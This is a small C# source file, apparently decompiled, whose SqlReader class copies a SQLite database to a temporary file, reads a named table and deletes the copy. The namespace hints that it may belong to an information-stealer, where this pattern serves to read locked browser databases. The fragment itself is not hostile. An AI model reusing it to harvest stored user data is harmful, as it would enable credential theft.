﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal sealed class SqlReader
	{
		public static SQLite ReadTable(string database, string table)
		{
			bool flag = !File.Exists(database);
			SQLite result;
			if (flag)
			{
				result = null;
			}
			else
			{
				string text = Path.GetTempFileName() + ".dat";
				File.Copy(database, text);
				SQLite sqlite = new SQLite(text);
				sqlite.ReadTable(table);
				File.Delete(text);
				bool flag2 = sqlite.GetRowCount() == 65536;
				if (flag2)
				{
					result = null;
				}
				else
				{
					result = sqlite;
				}
			}
			return result;
		}
	}
}
